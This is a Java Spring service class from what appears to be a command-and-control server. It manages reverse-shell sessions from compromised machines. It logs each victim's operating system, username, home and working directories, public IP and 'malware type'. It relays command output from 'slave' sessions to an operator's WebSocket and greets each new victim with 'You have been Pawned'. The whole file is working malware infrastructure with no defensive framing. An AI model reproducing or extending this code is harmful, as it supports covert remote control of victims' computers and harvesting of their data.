package com.mtattab.c2cServer.service.impl.shell.management;

import com.mtattab.c2cServer.model.json.RestOutputModel;
import com.mtattab.c2cServer.model.json.shell.AgentCommandRestOutputModel;
import com.mtattab.c2cServer.model.json.shell.InitialConnectionMessageModel;
import com.mtattab.c2cServer.model.json.shell.ManagerCommunicationModel;
import com.mtattab.c2cServer.model.json.shell.ReverseShellInfoInitialMessage;
import com.mtattab.c2cServer.model.entity.SessionLogEntity;
import com.mtattab.c2cServer.repository.SessionLogRepository;
import com.mtattab.c2cServer.service.ReverseShellClientHandlerService;
import com.mtattab.c2cServer.service.observable.ActiveSessionsObservable;
import com.mtattab.c2cServer.util.ConnectionManager;
import com.mtattab.c2cServer.util.DataManipulationUtil;
import com.mtattab.c2cServer.util.SocketUtil;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.io.IOException;
import java.sql.Timestamp;
import java.time.LocalDateTime;
import java.util.Objects;

@Service
@Slf4j
public class ReverseShellClientHandlerServiceImpl implements ReverseShellClientHandlerService {

    @Autowired
    ActiveSessionsObservable activeSessionsObservable;
    @Autowired
    SessionLogRepository sessionLogRepository;

    public void addActiveSession(WebSocketSession session, TextMessage message){
        if (!ConnectionManager.activeReverseShellSessions.contains(session)){
            SessionLogEntity sessionLogEntity = logSessionInDb(session, message);
            activeSessionsObservable.addReverseShellSession(session, sessionLogEntity);

        }
    }

    public void removeActiveSession(WebSocketSession session){
        activeSessionsObservable.removeReverseShellSession(session);
        logSessionOutInDb(session);

    }

    private SessionLogEntity logSessionInDb(WebSocketSession session, TextMessage message){
        try {
            ReverseShellInfoInitialMessage initialInfoMessage = DataManipulationUtil.
                    jsonToObject(message.getPayload(), ReverseShellInfoInitialMessage.class);

            System.out.println(initialInfoMessage);

            SessionLogEntity logEntity=  SessionLogEntity.builder()
                    .sessionId(session.getId())
                    .sessionLocalAddress(Objects.requireNonNull(session.getLocalAddress()).toString())
                    .sessionRemoteAddress(Objects.requireNonNull(session.getRemoteAddress()).toString())

                    .sessionCreatedAt(Timestamp.valueOf(LocalDateTime.now()))
                    .hasFiles("N")
                    .build();

            if (initialInfoMessage != null){
                setUserInfoToTheLog(logEntity, initialInfoMessage);
            }

            return sessionLogRepository.save(logEntity);




        }catch (Exception e){
            log.error("[-] exception occurred while saving session: {}",e.getMessage());
            e.printStackTrace();
        }
        return null;

    }
    private void setUserInfoToTheLog(SessionLogEntity logEntity, ReverseShellInfoInitialMessage initialInfoMessage){
        logEntity.setOsName(initialInfoMessage.getOsName());
        logEntity.setOsVersion(initialInfoMessage.getOsVersion());
        logEntity.setOsArch(initialInfoMessage.getOsArch());
        logEntity.setUserName(initialInfoMessage.getUserName());
        logEntity.setUserHome(initialInfoMessage.getUserHome());
        logEntity.setUserCurrentWorkingDir(initialInfoMessage.getUserCurrentWorkingDir());
        logEntity.setUserLanguage(initialInfoMessage.getUserLanguage());
        logEntity.setPublicIp(initialInfoMessage.getUserPublicIp());
        logEntity.setMalwareType(initialInfoMessage.getMalwareType());
    }



    private void logSessionOutInDb(WebSocketSession session){
        try {
            sessionLogRepository.updateSessionToClosed(Timestamp.valueOf(LocalDateTime.now()), session.getId());
        }catch (Exception e){
            log.error("[-] exception occurred while removing session: {}",e.getMessage());
            e.printStackTrace();
        }
    }



    private boolean rerouteToWebsocket(AgentCommandRestOutputModel agentCommandRestOutputModel, WebSocketSession session){
        if (agentCommandRestOutputModel == null)return false;
        if (agentCommandRestOutputModel.getUuid()!=null ){
            String uuid = agentCommandRestOutputModel.getUuid();

            WebSocketSession managerSession = ConnectionManager.rerouteAllCommandToMangerSession.get(uuid);
            if (managerSession!=null){
                SocketUtil.sendMessage(managerSession, new TextMessage(
                        DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                                .msg(agentCommandRestOutputModel.getOutput())
                                .slaveSessionId(session.getId())
                                .build()
                        )));
                return true;
            }


        }
        return false;
    }

    public void handleReverseShellClient(WebSocketSession session, TextMessage message) throws IOException {
        String clientMessage = message.getPayload();
        if (SocketUtil.keepAliveHandle(message)){
            return;
        }
        //        ManagerCommunicationModel managerCommunicationModel= DataManipulationUtil.jsonToObject(clientMessage, ManagerCommunicationModel.class);



        // Handle the client's message (e.g., send a response back to the client)
        String responseMessage =  clientMessage;
        System.out.println(responseMessage);

        AgentCommandRestOutputModel agentCommandRestOutputModel = DataManipulationUtil.
                jsonToObject(message.getPayload(), AgentCommandRestOutputModel.class);

        if (rerouteToWebsocket(agentCommandRestOutputModel,session)){
            return;
        }


        WebSocketSession mangerSession = ConnectionManager.connectedReverseToManagerSessions.get(session);
        if (mangerSession!=null){


            if (agentCommandRestOutputModel!=null){
                responseMessage = agentCommandRestOutputModel.getOutput();
            }

            SocketUtil.sendMessage(mangerSession, new TextMessage(
                    DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                            .msg(responseMessage)
                            .slaveSessionId(session.getId())
                            .build()
                    )));
        }

    }




    public void sendIntialMessage(WebSocketSession session){
        SocketUtil.sendMessage(session, new TextMessage(
                DataManipulationUtil.convertObjectToJson(InitialConnectionMessageModel.builder()
                        .sessionId(session.getId())
                        .initialMessage("You have been Pawned")
                        .build())

        ));
    }


}
